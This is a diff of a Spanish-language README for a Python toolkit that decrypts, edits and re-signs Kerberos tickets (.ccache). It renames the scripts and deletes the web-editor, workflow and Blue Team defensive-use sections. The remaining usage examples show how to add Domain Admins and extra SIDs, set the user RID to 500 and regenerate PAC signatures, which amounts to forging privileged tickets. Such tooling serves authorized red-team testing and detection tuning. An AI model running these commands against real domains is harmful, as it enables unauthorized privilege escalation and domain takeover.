@@ -28,7 +28,7 @@ Formatos de clave soportados (según `etype` del ticket):
 
 ---
 
-## `view_ticket.py` — Visor de tickets (solo lectura)
+## `tgtview.py` — Visor de tickets (solo lectura)
 
 Parsea el contenedor `.ccache`, muestra los metadatos de cada credencial y, si se
 indica la clave, **descifra** la parte cifrada del ticket y **decodifica el PAC**
@@ -38,16 +38,16 @@ indica la clave, **descifra** la parte cifrada del ticket y **decodifica el PAC*
 
 ```bash
 # Solo la parte en claro (sin descifrar)
-python3 view_ticket.py ticket.ccache
+python3 tgtview.py ticket.ccache
 
 # Descifrar y mostrar el PAC (RC4 / etype 23)
-python3 view_ticket.py ticket.ccache -k <NT_hash>
+python3 tgtview.py ticket.ccache -k <NT_hash>
 
 # Descifrar y mostrar el PAC (AES / etype 17 ó 18)
-python3 view_ticket.py ticket.ccache -k <AES_key_hex>
+python3 tgtview.py ticket.ccache -k <AES_key_hex>
 
 # Exportar los parámetros extraídos como JSON
-python3 view_ticket.py ticket.ccache -k <key> --json
+python3 tgtview.py ticket.ccache -k <key> --json
 ```
 
 ### Opciones
@@ -70,7 +70,7 @@ python3 view_ticket.py ticket.ccache -k <key> --json
 
 ---
 
-## `edit_ticket.py` — Editor in situ
+## `tgtedit.py` — Editor in situ
 
 Abre un ticket **existente**, descifra con su clave, aplica **solo** los cambios que
 indiques sobre el `PAC_LOGON_INFO` y **conserva todo lo demás byte a byte** (tiempos,
@@ -84,14 +84,14 @@ Es una herramienta **autónoma** (solo depende de `pycryptodome`).
 
 ```bash
 # Añadir Domain Admins (512) y un extra-SID, conservando el resto
-python3 edit_ticket.py admin.ccache -k <key> \
+python3 tgtedit.py admin.ccache -k <key> \
     --add-groups 512 --add-extra-sids S-1-5-21-10-20-30-519
 
 # Cambiar el RID del usuario a 500 (Administrator) sin tocar tiempos/clave
-python3 edit_ticket.py admin.ccache -k <key> --user-id 500 -o editado.ccache
+python3 tgtedit.py admin.ccache -k <key> --user-id 500 -o editado.ccache
 
 # Reemplazar por completo la lista de grupos
-python3 edit_ticket.py admin.ccache -k <key> --groups 513,512,518,519,520
+python3 tgtedit.py admin.ccache -k <key> --groups 513,512,518,519,520
 ```
 
 ### Opciones
@@ -116,39 +116,7 @@ python3 edit_ticket.py admin.ccache -k <key> --groups 513,512,518,519,520
 
 ---
 
-## `ticket_web.py` *(opcional)* — Editor web
 
-Interfaz local que usa `edit_ticket.py` como motor. Subes el `.ccache` + la clave, lo
-descifra y presenta un editor dinámico de **casi todos los campos**: principales,
-realm, `cname`/`crealm`, **flags del ticket como bits**, clave de sesión, tiempos y
-todo el `PAC_LOGON_INFO` (grupos con `attr`, extra-SIDs con `attr`, **UAC como bits**,
-SID de dominio, RID…), con añadir/quitar filas. Al generar, re-firma y re-cifra y
-descarga el ticket resultante.
-
-```bash
-python3 ticket_web.py      # abre http://127.0.0.1:8000
-```
-
-> El servidor escucha **solo en `127.0.0.1`** (local). No lo expongas en red.
-
----
-
-## Flujo típico (extraer → modificar → re-forjar)
-
-```bash
-# 1) Inspeccionar y extraer parámetros
-python3 view_ticket.py base.ccache -k <key>
-python3 view_ticket.py base.ccache -k <key> --json > params.json
-
-# 2) Modificar (p. ej. escalar privilegios)
-python3 edit_ticket.py base.ccache -k <key> \
-    --add-groups 512 --user-id 500 -o escalado.ccache
-
-# 3) Verificar el resultado (round-trip)
-python3 view_ticket.py escalado.ccache -k <key>
-```
-
----
 
 ## Notas técnicas
 
@@ -157,19 +125,11 @@ python3 view_ticket.py escalado.ccache -k <key>
   y la verificación/cálculo de firmas del PAC (HMAC-SHA1-96 y HMAC-MD5).
 - Al editar el PAC, **las firmas se recalculan siempre**: cambiar el contenido invalida
   las firmas previas, por lo que `SERVER_CHECKSUM`/`KDC_CHECKSUM` se regeneran.
-- `edit_ticket.py` preserva los buffers del PAC que no modifica (`CLIENT_INFO`, etc.);
+- `tgtedit.py` preserva los buffers del PAC que no modifica (`CLIENT_INFO`, etc.);
   actualmente `CLIENT_INFO` no se sincroniza automáticamente al cambiar la cuenta.
 
 ---
 
-## Aplicación defensiva (Blue Team)
-
-Además del uso ofensivo, el toolkit sirve para **generar muestras controladas** con las
-que afinar detecciones: tickets con vigencia anómala (p. ej. 10 años), ausencia de
-`UPN_DNS_INFO`, inconsistencias de PAC o firmas, útiles para validar reglas de SIEM,
-telemetría de Kerberos y hardening de AD.
-
----
 
 ## Aviso legal
 
